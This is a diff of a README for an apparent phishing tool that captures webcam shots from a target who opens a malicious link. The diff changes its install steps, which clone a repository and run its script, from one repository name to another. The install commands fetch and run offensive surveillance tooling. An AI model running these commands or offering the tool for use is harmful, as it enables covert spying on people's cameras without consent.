@@ -13,8 +13,8 @@ Take webcam shots from target just sending a malicious link
 ## Installing (Kali Linux/Termux):
 
 ```
-git clone https://github.com/thelinuxchoice/saycheese
-cd saycheese
-bash saycheese
+git clone https://github.com/orion110/ISeeYou
+cd ISeeYou
+bash ISeeYou
 ```
 
